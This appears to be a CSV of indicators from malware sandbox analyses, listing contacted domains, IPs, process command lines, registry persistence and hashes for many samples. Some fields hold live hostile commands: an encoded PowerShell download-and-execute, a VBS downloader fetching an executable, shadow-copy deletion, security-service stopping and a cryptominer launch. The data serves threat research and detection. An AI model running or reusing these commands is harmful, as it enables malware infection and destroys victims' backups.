file_name,Value,Address_Value,PID,Name,Parent_PID,File_Name,Command_Line,Current_Directory,Path,Full_Path,File_Path,Device_Path,File_Extension,Key,Hive,Data,Datatype,Display_Name,Service_Type,Startup_Command_Line,Startup_Type,Simple_Hash_Value,Type,Hostname_Value,Layer7_Protocol,Port_Value,Layer4_Protocol,Properties
04ad737a6336.xml,zaratoons.info,212.73.150.207,2880,ApplicationBase,2880,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" powershell -EncodedCommand JABwAGEAdABoACAAPQAgACcALwBmAGEAeAAuAHAAaABwAD8AaQBkAD0AYQBkAG0AaQBuACcAOwAgACQAaABvAHMAdABuAGEAbQBlACAAPQAgACcAegBhAHIAYQB0AG8AbwBuAHMALgBpAG4AZgBvACcAOwAgAEkAJwAnAEUAJwAnAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AJwAgACsAIAAkAGgAbwBzAHQAbgBhAG0AZQAgACsAIAAkAHAAYQB0AGgAKQA7AA==",C:\Windows\system32\,c:\windows\system32\windowspowershell\v1.0\powershell.exe,conout$,windows\system32\windowspowershell\v1.0\getevent.types.ps1xml,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
068ee14069f2.xml,mzrevenge.ga,128.127.106.29,2908,ApplicationBase,2940,cmd.exe,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\aUsMWsjhpLkBV4ai.exe"" ",C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\windows\syswow64\cmd.exe,,,,,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,1,REG_DWORD_LITTLE_ENDIAN,,,,,,,,,,,
08fc0df9273e.xml,robotrade.com.vn,103.74.123.3,2432,DbgJITDebugLaunchSetting,2692,vbc.exe,"""{path}""",C:\Windows\system32\,c:\windows\microsoft.net\framework\v2.0.50727\vbc.exe,,,,,Software\Microsoft\.NETFramework,HKEY_CURRENT_USER,,,,,,,,,,,,,
1f8feaadbc49.xml,,,2376,DisableUNCCheck,2376,cmd.exe,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\whzqnu.exe"" ",C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,boot\bcd.log,c:\,txt,Software\Microsoft\Command Processor,HKEY_CURRENT_USER,,,,,,,,,,,,,
2019-snatch-ransomware.xml,,,2252,SystemStartOptions,820,vssadmin.exe,vssadmin delete shadows /all /quiet,C:\Windows\system32\,c:\windows\syswow64\vssadmin.exe,,,,,SYSTEM\CurrentControlSet\Control,HKEY_LOCAL_MACHINE,Service,REG_SZ,This service make backup copy every day,SERVICE_WIN32_OWN_PROCESS,C:\Users\aETAdzjz\Desktop\snatch-d0ddc221.vir.exe is auto-started,SERVICE_AUTO_START,,,,,,,
233767c999cb.xml,,,2532,key2,1544,233767c999cb351c19f993039552a3be754cc0bb87304ab50b74433015b08316.exe,"""C:\Users\EEBsYm5\Desktop\233767c999cb351c19f993039552a3be754cc0bb87304ab50b74433015b08316.exe"" ",C:\Users\EEBsYm5\Desktop\,c:\users\eebsym5\desktop\233767c999cb351c19f993039552a3be754cc0bb87304ab50b74433015b08316.exe,c:\users\all users\package cache\{13a4ee12-23ea-3371-91ee-efb36ddfff3e}v12.0.21005\packages\vcruntimeminimum_x86\18118810.gqkyo,users\all users\package cache\{13a4ee12-23ea-3371-91ee-efb36ddfff3e}v12.0.21005\packages\vcruntimeminimum_x86\18118810.gqkyo,c:\,txt,SOFTWARE\AppDataLow\Software\,HKEY_CURRENT_USER,BgIAAACkAABSU0ExAAQAAAEAAQAHKAWXCKQYidApAAfY3ZkxYnoiTvokaNYzMFedPRDdlc6gtHAbL6JH5L4E4tam5sAPnAm7gsyuSnDRwnlmfutwuPuBZSonphttXXvG2BpnxwBMyHsKdyIcoChIV1LMuWqIgI0uCRUb1nOVY+KRoq3Otoi1Cm99Il584v5nmY2j7g==,REG_SZ,,,,,3d4e3b1f72e8c25008dd88ad2c93581b,MD5,,,,,
263cf261a45e.xml,www.fuente-ovejuna.cz,156.67.210.210,3692,Timeout,484,cscript.exe,"""C:\Windows\System32\CScript.exe""  ""C:\Users\CIIHMN~1\Desktop\PAQUET~1.JS"" ",C:\Windows\system32\,c:\windows\system32\cscript.exe,STD_OUTPUT_HANDLE,Users\CIiHmnxMn6Ps\AppData\Local\nzpnpqiti\86976.exe,c:\,exe,Software\Microsoft\Windows Script Host\Settings,HKEY_LOCAL_MACHINE,"""C:\Users\CIiHmnxMn6Ps\AppData\Local\Relatorio_Erros\svchost.exe""",REG_SZ,,,,,f612bccf909dbc5bbf1779d44a9ca045,MD5,www.wkc.co.id,HTTP,443,,
2c5729e17b64.xml,i86h.com,217.182.53.69,2308,ApplicationBase,1532,cmd_.exe,"""C:\Program Files\Adobe\Reader 8.0.0\Reader\AcroRd32.exe""",C:\Users\BMe1N39jU1 6criBQ\Documents\,c:\program files\adobe\reader 8.0.0\reader\acrord32.exe,STD_OUTPUT_HANDLE,users\bme1n39ju1 6cribq\appdata\roaming\intel\sign.bin,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,C:\Users\BME1N3~1\AppData\Local\Temp\cmd_.exe -a,REG_SZ,,,,,,,i86h.com,HTTP,80,,
303ad8c115d9.xml,ron4law.com,50.87.144.227,2492,Client,1112,cmd.exe, ,C:\Windows\system32\,c:\windows\system32\cmd.exe,STD_INPUT_HANDLE,windows\system32\c_1252.nls,c:\,dll,Software\AppDataLow\Software\Microsoft\3632F5D8-1D04-D8B6-57CA-A18C7B9E6580,HKEY_CLASSES_ROOT,"rundll32 ""C:\Users\aETAdzjz\AppData\Roaming\Microsoft\Crypore6\bdeskmgr.dll""",REG_BINARY,,,,,,,,,,,
329b3ddbf1c0.xml,www.kakaocorp.link,185.52.2.154,3788,Domain,1404,rlxsbp.exe,"""C:\Users\CIiHmnxMn6Ps\Desktop\rlxsbp.exe"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\users\ciihmnxmn6ps\desktop\rlxsbp.exe,c:\users\ciihmnxmn6ps\appdata\roaming\mozilla\firefox\profiles\8i341t8m.default\gmp-gmpopenh264\1.6\gmpopenh264.info.sfrpesivt,users\ciihmnxmn6ps\appdata\roaming\mozilla\firefox\profiles\8i341t8m.default\gmp-gmpopenh264\1.6\gmpopenh264.info.sfrpesivt,c:\,sfrpesivt,Keyboard Layout\Preload,HKEY_LOCAL_MACHINE,,,,,,,,,www.kakaocorp.link,HTTP,80,,
32f7a9e9e50f.xml,google.com,172.217.23.142,1224,svchost.exe,472,svchost.exe,C:\ProgramData\VWcUEoYI\ssYIYkgc.exe,C:\Windows\system32\,c:\windows\system32\svchost.exe,,,,,software\microsoft\windows\currentversion\run,HKEY_LOCAL_MACHINE,C:\ProgramData\GSogosQc\YMIIsQMA.exe,REG_SZ,lMMYIkPL,SERVICE_WIN32_OWN_PROCESS,C:\ProgramData\VWcUEoYI\ssYIYkgc.exe,SERVICE_AUTO_START,,,google.com,HTTP,80,TCP,
3692f99b7666.xml,icanhazip.com,46.173.218.240,2236,ApplicationBase,1640,cmd.exe,''46.173.218.240'',C:\Windows\system32\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,windows\syswow64\windowspowershell\v1.0\getevent.types.ps1xml,c:\,ps1xml,Software\Microsoft\VBA\7.1\Common,HKEY_LOCAL_MACHINE,0,REG_SZ,,,,,,,icanhazip.com,HTTP,80,TCP,
43e67197f480.xml,,,3132,BrowserUpdateCheck,1288,svhost.exe,"""C:\Users\CIiHmnxMn6Ps\Desktop\svhost.exe"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\users\ciihmnxmn6ps\desktop\svhost.exe,c:\users\ciihmnxmn6ps\appdata\local\iconcache.db.ox4444,users\ciihmnxmn6ps\appdata\local\iconcache.db.ox4444,c:\,ox4444,Software\Microsoft\Windows\CurrentVersion\RunOnce,HKEY_CURRENT_USER,C:\Users\CIiHmnxMn6Ps\AppData\Local\svhost.exe,REG_SZ,,,,,,,,,,,
49a56e067a73.xml,raw.githubusercontent.com,151.101.12.133,4452,1668818982,1376,brjujs.exe,"""C:\Users\FD1HVy\Desktop\brjujs.exe"" ",C:\Users\FD1HVy\Desktop\,c:\users\fd1hvy\desktop\brjujs.exe,,,,,SOFTWARE\Microsoft\Windows NT\CurrentVersion,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
4b12f4fdf07d.xml,,,2124,sc.exe,2000,sc.exe,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\lok.exe"" ",C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\windows\system32\sc.exe,,,,,SOFTWARE\Microsoft\Windows NT\CurrentVersion,HKEY_LOCAL_MACHINE,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\lok.exe""",REG_SZ,,,,,,,,,,,
4e38fd97f1d6.xml,smtp.yandex.ru,213.180.204.38,2704,Email,2144,nrpswgral.exe,"""C:\Users\FD1HVy\Desktop\nrpswgral.exe"" ",C:\Users\FD1HVy\Desktop\,c:\users\fd1hvy\desktop\nrpswgral.exe,c:\windows\microsoft.net\framework\v4.0.30319\config\machine.config,windows\microsoft.net\framework\v4.0.30319\config\machine.config,c:\,ini,SOFTWARE\Microsoft\.NETFramework\v4.0.30319,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
4ef2c020a2f4.xml,www.sgnaturn.com,198.54.121.5,2284,DisableUNCCheck,924,cmd.exe,"""C:\Windows\System32\cmd.exe"" /c CD %temp% & @echo set H2hA8cL7vV6cF1uZ5hR8wN6sP3aV6cG1c = createobject(""wscript.shell"") >ZMXZAA.vBS & @echo Dim X3eH5tN6kV3tX2yS6cM8qZ5iV1oB0aR0nN5pF1kR1kJ7x >>ZMXZAA.vBS & @echo Dim R2qL4oI3mN2vD9iQ1sX7cY9oA0fK0hS7dL1w >>ZMXZAA.vBS & @echo Dim B8yU2nW4oD3lW4vO1xP2nY9oR3e >>ZMXZAA.vBS & @echo Dim N9nY8xU9gT0oC0bB7aN5wT8qV8rR9bT6yV2iA5oO8eL7rF2jF6mY8zG3fG0i >>ZMXZAA.vBS & @echo X3eH5tN6kV3tX2yS6cM8qZ5iV1oB0aR0nN5pF1kR1kJ7x = ""http://82.118.242.107/~able/1_ga/al/al.exe"" >>ZMXZAA.vBS & @echo R2qL4oI3mN2vD9iQ1sX7cY9oA0fK0hS7dL1w = ""JSTCHV.eXe"" >>ZMXZAA.vBS & @echo Set B8yU2nW4oD3lW4vO1xP2nY9oR3e = CreateObject(""MSXML2.XMLHTTP"") >>ZMXZAA.vBS & @echo B8yU2nW4oD3lW4vO1xP2nY9oR3e.Open ""GET""",C:\Windows\system32\,c:\windows\syswow64\cmd.exe,STD_INPUT_HANDLE,users\aetadzjz\appdata\local\temp\zmxzaa.vbs,\??\C:\,ini,Software\Microsoft\Internet Explorer\Main\FeatureControl,HKEY_LOCAL_MACHINE,C:\Program Files (x86)\Flpxdufw0\mskr8xjle.exe,REG_SZ,,,,,,,www.sgnaturn.com,HTTP,80,TCP,"
                "
53f7d917ad9e.xml,pilodirsob.com,5.188.60.53,2568,DisplayVersion,1112,cmd.exe,"cmd /C ""echo -------- >> C:\Users\aETAdzjz\AppData\Local\Temp\1D0E.bin1""",C:\Windows\system32\,c:\windows\system32\cmd.exe,STD_OUTPUT_HANDLE,users\aetadzjz\appdata\local\temp\1d0e.bin1,c:\,jpg,SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{26A24AE4-039D-4CA4-87B4-2F03217071FF},HKEY_LOCAL_MACHINE,0,REG_BINARY,,,,,,,,,,,
540b64d8ff20.xml,api.ipify.org,107.22.251.25,3060,SMTP Server,1112,sjfhjjskfsf.exe,"""C:\Users\aETAdzjz\AppData\Roaming\appdata\sjfhjjskfsf.exe""",C:\Windows\system32\,c:\users\aetadzjz\appdata\roaming\appdata\sjfhjjskfsf.exe,,,,,Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676,HKEY_CURRENT_USER,,,,,,,,,,,,,
5d4e22be32dc.xml,www.vacanzaimmobiliare.it,185.81.4.56,2404,Email,1116,nqmdwcixbxs.exe,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\nqmdwcixbxs.exe"" ",C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\users\5p5nrgjn0js halpmcxz\desktop\nqmdwcixbxs.exe,c:\windows\microsoft.net\framework\v2.0.50727\config\machine.config,windows\microsoft.net\framework\v2.0.50727\config\machine.config,c:\,ini,Software\Microsoft\Wbem\Scripting,HKEY_CURRENT_USER,C:\Users\5p5NrGJn0jS HALPmcxz\AppData\Roaming\Java\JavaUpdtr.exe,REG_SZ,,,,,,,,,,,
634ad02fba53.xml,google.com,,2136,Task Protect 2.3,1288,urkotu.exe,"""C:\Users\CIiHmnxMn6Ps\Desktop\urkotu.exe"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\users\ciihmnxmn6ps\desktop\urkotu.exe,c:\users\ciihmnxmn6ps\desktop\urkotu.exe,users\ciihmnxmn6ps\desktop\urkotu.exe,c:\,exe,Software\AppDataLow\Software\{2F917068-DC0D-ADE9-C564-77CBD67FE7B8}\11881FB1\e6577de29e95e38a02,HKEY_CURRENT_USER,3,REG_SZ,,,,,,,,,,,
695e211d206e.xml,api.db-ip.com,104.26.5.15,1996,ApplicationBase,4024,net.exe,"""C:\Users\FD1HVy\Desktop\yjpgfqu.exe"" ",C:\Users\FD1HVy\AppData\Local\Temp\,c:\windows\syswow64\net.exe,,,,,Software\Microsoft\PowerShell\3\PowerShellEngine,HKEY_LOCAL_MACHINE,NEMTY_D73IOGW,REG_SZ,,,,,,,,,,,
6d365f7901cd.xml,,,2720,IgnoreUserSettings,2808,hsbftstclaogdeeotf.exe,"""C:\Users\5P5NRG~1\AppData\Local\Temp\hSbFTsTClaogdEEotf.exe"" ",C:\Windows\system32\,c:\users\5p5nrg~1\appdata\local\temp\hsbftstclaogdeeotf.exe,STD_OUTPUT_HANDLE,users\5p5nrgjn0js halpmcxz\appdata\local\temp\tmp4ef.tmp,c:\,exe,Software\Microsoft\Windows Script Host\Settings,HKEY_LOCAL_MACHINE,C:\Program Files (x86)\IMAP Service\imapsv.exe,REG_SZ,,,,,f6cb9cb7189e5b3311511a09bf49bc60,MD5,,,,,"
                "
6e4cc242e9b4.xml,workharder.club,185.252.213.161,2788,DisplayName,1384,1.exe,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\1.exe"" ",C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\users\5p5nrgjn0js halpmcxz\desktop\1.exe,STD_INPUT_HANDLE,users\5p5nrg~1\appdata\local\temp\209150999161799351040.tmp-wal,c:\,txt,Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\00000003,HKEY_LOCAL_MACHINE,,,,,,,,,workharder.club,HTTP,80,,
72cca77c3813.xml,,,4288,Identifier,1376,mfo4ed9hfrpsso4o.exe,"""C:\Users\FD1HVy\Desktop\mFO4ED9hfrpsSO4O.exe"" ",C:\WINDOWS\system32\,c:\users\fd1hvy\desktop\mfo4ed9hfrpsso4o.exe,,,,,HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0,HKEY_USERS,,,,,,,,,,,,,
7ea94da41974.xml,jadema.com.py,192.185.73.158,2336,ApplicationBase,1120,Windows\SysWOW64\ntdll.dll,"""C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE"" /n",C:\Users\aETAdzjz\Desktop\,c:\users\aetadzjz\appdata\local\temp\62890218\fsk.exe,STD_INPUT_HANDLE,Windows\SysWOW64\ntdll.dll,\??\C:\,ini,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,C:\Program Files (x86)\Lihhl\services3f4.exe,REG_SZ,,,,,,,jadema.com.py,HTTP,80,TCP,
81f1a5faaa79.xml,vdtogt.nl,74.141.205.116,2468,ApplicationBase,3080,aeroroyale.exe,"""C:\Users\BGC6u8Oy yXGxkR\AppData\Local\Microsoft\Windows\aeroroyale.exe""",C:\Users\BGC6u8Oy yXGxkR\Desktop\,c:\users\bgc6u8oy yxgxkr\appdata\local\microsoft\windows\aeroroyale.exe,STD_OUTPUT_HANDLE,windows\system32\windowspowershell\v1.0\dotnettypes.format.ps1xml,c:\,dat,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,,,,,,,,,vdtogt.nl,HTTP,80,UDP,
8af0d99cef6f.xml,,,864,DisableUNCCheck,864,sc.exe,sc stop wscsvc,C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\windows\syswow64\sc.exe,,,,,Software\Microsoft\Internet Explorer\Main\FeatureControl,HKEY_CURRENT_USER,┢偁䑐呁╁浜瑨灯㈳楢⹴硥≥,REG_SZ,,,,,,,,,,,
8de41ace64ef.xml,tnaapparels.com,192.95.7.159,2424,UninstallString,1544,3838612080743901967.exe,"""C:\Users\EEBsYm5\Desktop\3838612080743901967.exe"" ",C:\Users\EEBsYm5\Desktop\,c:\users\eebsym5\desktop\3838612080743901967.exe,c:\users\eebsym5\appdata\local\temp\18144644.bat,users\eebsym5\appdata\local\temp\18144644.bat,c:\,dat,Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\00000001,HKEY_LOCAL_MACHINE,,,,,,,3880eeb1c736d853eb13b44898b718ab,MD5,tnaapparels.com,HTTP,80,TCP,
93986d4e88a8.xml,supermen22.beget.tech,5.101.152.252,3600,DisplayName,1404,globalhack[rueunavn][17.02.2019] .exe,"""C:\Users\CIiHmnxMn6Ps\Desktop\GlobalHack[RUEUNAVN][17.02.2019] .exe"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\users\ciihmnxmn6ps\desktop\globalhack[rueunavn][17.02.2019] .exe,c:\users\ciihmnxmn6ps\appdata\roaming\mozilla\firefox\profiles\8i341t8m.default\cookies.sqlite,users\ciihmnxmn6ps\appdata\roaming\mozilla\firefox\profiles\8i341t8m.default\cookies.sqlite,c:\,txt,SOFTWARE\Microsoft\Cryptography,HKEY_LOCAL_MACHINE,,,,,,,,,supermen22.beget.tech,HTTP,80,,
9b86a50b36ae.xml,,,2076,net.exe,1884,net.exe,"""C:\Windows\System32\net.exe"" stop MSSQL$VEEAMSQL2008R2 /y",C:\Windows\system32\,c:\windows\system32\net.exe,STD_OUTPUT_HANDLE,users\public\sys,c:\,png,Software\Microsoft\Command Processor,HKEY_CURRENT_USER,C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\xhcdxx.exe,REG_SZ,,,,,,,,,,,
a14e514ddfc3.xml,185.222.202.79/sat36/YKYD69Q_W617601.2E664EE04488A02C628E0E6CA864C24A/5/spk/,64.44.51.87,2376,ApplicationBase,2116,cmd.exe,"""C:\Users\aETAdzjz\AppData\Local\Temp\fulezad.exe"" ",C:\Windows\system32\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,windows\syswow64\ntdll.dll,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,,,,,,,,,,HTTP,443,TCP,
a703dc8819dc.xml,,,4896,VbaCapability,1984,winword.exe,"""C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE"" /n",C:\Users\FD1HVy\Desktop\,c:\program files\microsoft office\root\office16\winword.exe,,,,,TypeLib\{00020905-0000-0000-C000-000000000046}\8.7\0,HKEY_CLASSES_ROOT,,,,,,,,,,,,,
b2946daf21b5.xml,rijschoolfastandserious.nl,127.0.0.1,4880,ApplicationBase,3648,explorer.exe,C:\WINDOWS\SysWOW64\explorer.exe,C:\WINDOWS\system32\,c:\windows\explorer.exe,,,,,Software\Microsoft\VBA\7.1\Common,HKEY_CLASSES_ROOT,,,,,,,,,,,,,
b365a249a15c.xml,xbr6lge984320911.notafiscal05.com,35.196.254.156,2800,userinit.exe,2712,userinit.exe,"""C:\Windows\System32\userinit.exe""",C:\Windows\system32\,c:\windows\system32\userinit.exe,c:\programdata\tempa\marxvxinhhmg.gif,programdata\tempa\marxvxinhhmg.gif,c:\,gif,Software\Microsoft\Command Processor,HKEY_LOCAL_MACHINE,,,,,,,,,xbr6lge984320911.notafiscal05.com,HTTP,80,,
bad-rabbit-ransomware-flash-analysis.xml,,192.168.0.0,1672,DisableUNCCheck,472,cmd.exe,\??\C:\Windows\system32\conhost.exe,C:\Windows\system32\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,windows\infpub.dat,c:\,xml,Software\Microsoft\Command Processor,HKEY_LOCAL_MACHINE,1632268,REG_MULTI_SZ,Windows Client Side Caching DDriver,SERVICE_KERNEL_DRIVER,cscc.dat,SERVICE_BOOT_START,1d724f95c61f1055f0d02c2154bbccd3,MD5,,,445,TCP,
blackruby-ransomware.xml,freegeoip.net,104.31.11.172,2528,Global\.net clr networking,2528,svchost.exe,"""C:\Windows\System32\BlackRuby\Svchost.exe"" -o stratum+tcp://de01.supportxmr.com:3333 -u 43DmqxU4LzuTrmA8GLZ7S5J6w32bwCavX9bhvCiSEwwebfn4TCYRAxmPtWTZq9iQ1F6XYsktJEYBYDkhKu4KXw6rCCspxCJ -p EEBsYm5:CRH2YWU7",C:\Windows\system32\BlackRuby\,c:\windows\system32\blackruby\svchost.exe,,,,,SOFTWARE\Microsoft\BlackRuby,HKEY_LOCAL_MACHINE,Max,REG_SZ,,,,,,,freegeoip.net,HTTP,80,,
c2bd70495630.xml,,,2824,svchost.exe,444,svchost.exe,%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,C:\Windows\system32\,c:\windows\system32\svchost.exe,,,,,SOFTWARE\Microsoft\Cryptography,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
cc4e6e42f735.xml,connect-plus.co.uk,217.76.132.184,3040,ApplicationBase,3868,certmgr.exe,"""C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE"" /n",C:\Windows\system32\,c:\users\aetadzjz\appdata\local\msvcr100\certmgr.exe,,,,,Software\Microsoft\VBA\7.1\Common,HKEY_CURRENT_USER,"""C:\Users\aETAdzjz\AppData\Local\msvcr100\certmgr.exe""",REG_SZ,,,,,,,,,,,
cobalt-strike-beacon-hta-analysis.xml,LHnIwsj,13.32.218.187,1792,mshta.exe,3136,mshta.exe,"""C:\Windows\System32\mshta.exe""  ""C:\Users\CIIHMN~1\Desktop\SECURE~1.HTA"" ",C:\Windows\system32\,c:\windows\system32\mshta.exe,STD_OUTPUT_HANDLE,windows\cercf51.tmp,c:\,tmp,Software\Microsoft\Internet Explorer\ChakraRecycler,HKEY_LOCAL_MACHINE,,,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,dl6zxn23r8r14.cloudfront.net,HTTP,443,,
cryptowire-wanacry4-analysis.xml,blockchain.info/tobtc?currency=USD&value=1500,,2176,wanacr~1.exe,460,wanacr~1.exe,C:\PROGRA~1\COMMON~1\WANACR~1.EXE,C:\Windows\system32\,c:\progra~1\common~1\wanacr~1.exe,STD_OUTPUT_HANDLE,users\5jghkoaofdp\desktop\wanacry6.malware.exe,c:\,mp3,Software\Microsoft\Command Processor,INVALID,,,,,,,ec1abca3d8d1cf4cb5fe6cff5b19930c,MD5,blockchain.info,HTTP,443,,
d45dfa191469.xml,239.255.255.250,208.86.13.216,3704,svchost.exe,484,svchost.exe,"""C:\Windows\SysWOW64\indexerneutral.exe""",C:\Windows\system32\,c:\windows\system32\svchost.exe,STD_INPUT_HANDLE,windows\syswow64\eulacompile.exe,c:\,exe,interface\{aa5b6a80-b834-11d0-932f-00a0c90dcaa9},HKEY_CURRENT_USER,,,indexerneutral,SERVICE_WIN32_OWN_PROCESS,"""C:\Windows\SysWOW64\indexerneutral.exe""",SERVICE_AUTO_START,,,,HTTP,443,UDP,
d77378dcc42b.xml,www.macartegrise.eu,52.29.192.136,2556,1,1452,o.exe,"""C:\Users\EEBsYm5\Desktop\o.exe"" ",C:\Users\EEBsYm5\Desktop\,c:\users\eebsym5\desktop\o.exe,c:\documents and settings\ibagx-decrypt.html,documents and settings\ibagx-decrypt.html,c:\,html,Keyboard Layout\Preload,HKEY_CURRENT_USER,,,,,,,,,﻿www.billerimpex.com,HTTP,80,,
de4224eca5ac.xml,www.google.com,172.217.21.196,3332,InstallationType,1376,compito italiano.doc.exe,"""C:\Users\FD1HVy\Desktop\compito italiano.doc.exe"" ",C:\Users\FD1HVy\Desktop\,c:\users\fd1hvy\desktop\compito italiano.doc.exe,,,,,SOFTWARE\Microsoft\.NETFramework\v4.0.30319,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
emotet-2019-09-16.xml,smtp.gmail.com,207.204.50.27,2304,structsstructs.exe,1112,structsstructs.exe,--b23b2af2,C:\Windows\system32\,c:\users\aetadzjz\appdata\local\structsstructs\structsstructs.exe,STD_INPUT_HANDLE,windows\syswow64\ntdll.dll,c:\,exe,CLSID,HKEY_CLASSES_ROOT,"""C:\Users\aETAdzjz\AppData\Local\structsstructs\structsstructs.exe""",REG_SZ,,,,,,,,,,,
emotet-trickbot-july-2018-analysis.xml,comprealm.net,197.245.46.11,2368,ApplicationBase,2928,syncpack.exe, 35 ,C:\Users\kFT6uTQW\Desktop\,c:\users\kft6utqw\appdata\local\microsoft\windows\syncpack.exe,STD_OUTPUT_HANDLE,users\kft6utqw\appdata\local\temp\280.exe,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,,,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,www.icb.cl,HTTP,80,,"
                "
evasive-gootkit-banking-trojan.xml,localhost,109.230.199.30,3504,2500,2124,smsvchost32.exe,C:\Users\Nd9E1FYi\AppData\Local\Temp\SMSvcHost32.exe --vwxyz,C:\Users\Nd9E1FYi\Desktop\,c:\users\nd9e1fyi\appdata\local\temp\smsvchost32.exe,STD_OUTPUT_HANDLE,windows\system32\cmd.exe,c:\,ps1xml,Software\AppDataLow,HKEY_CURRENT_USER,3,REG_DWORD_LITTLE_ENDIAN,,,,,,,amd.martatovaglieri.it,HTTP,443,TCP,"
                "
evasive-guloader-cloudeye.xml,www.consultgenou.com,217.70.184.50,4296,xeuovifzzc.exe,1376,xeuovifzzc.exe,"""C:\Users\FD1HVy\Desktop\xeuovifzzc.exe"" ",C:\WINDOWS\system32\,c:\users\fd1hvy\desktop\xeuovifzzc.exe,,,,,Software\Microsoft\Command Processor,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
excel-drops-malicious-payload-february-2018.xml,kdotraky.com,101.99.75.184,2352,CurrentVersion,1100,heidi.exe,"""C:\Users\kFT6uTQW\AppData\Local\Temp\heidi.exe"" ",C:\Users\kFT6uTQW\Desktop\,c:\users\kft6utqw\appdata\local\temp\heidi.exe,c:\users\kft6utqw\appdata\local\temp\heidi.exe,users\kft6utqw\appdata\local\temp\heidi.exe,c:\,exe,Software\Borland\Locales,HKEY_LOCAL_MACHINE,,,,,,,a6a97f17880e37067c822e14a75bb3af,MD5,kdotraky.com,HTTP,80,TCP,
excel-executes-powershell-key-logger-analysis.xml,checkip.dyndns.org,164.160.128.121,1948,ApplicationBase,1312,windows\microsoft.net\framework\v2.0.50727\config\machine.config,"""C:\Program Files (x86)\Microsoft Office\Office12\EXCEL.EXE""",C:\Users\kFT6uTQW\Desktop\,c:\users\kft6utqw\appdata\roaming\aap6.exe,c:\windows\microsoft.net\framework\v2.0.50727\config\machine.config,windows\microsoft.net\framework\v2.0.50727\config\machine.config,c:\,ps1xml,SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections,HKEY_LOCAL_MACHINE,C:\Users\kFT6uTQW\AppData\Roaming\DURA Automotive Systems Inc\DURA Automotive Systems Inc.exe,REG_SZ,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,3lionsfactory.ga,HTTP,80,,
f664d5e8a470.xml,dns1.soprodns.ru,185.198.57.157,876,Global\PowerShell_CommandAnalysis_Lock_S-1-5-21-3643094112-4209292109-138530109-1001,3016,nslookup.exe,"""C:\Windows\System32\CScript.exe""  ""C:\Users\5JGHKO~1\Desktop\PRICAZ~1.JS"" ",C:\Windows\system32\,c:\windows\syswow64\nslookup.exe,STD_OUTPUT_HANDLE,users\5jghkoaofdp\appdata\roamingeox20.exe,c:\,mui,Software\Microsoft\Windows Script Host\Settings,HKEY_LOCAL_MACHINE,"""C:\Users\5JgHKoaOfdp\AppData\RoamingeOX20.eXe""",REG_SZ,,,,,e6cf22b643516b1cbc1454324c2aa5cb,MD5,telemetry7win.at,HTTP,80,,
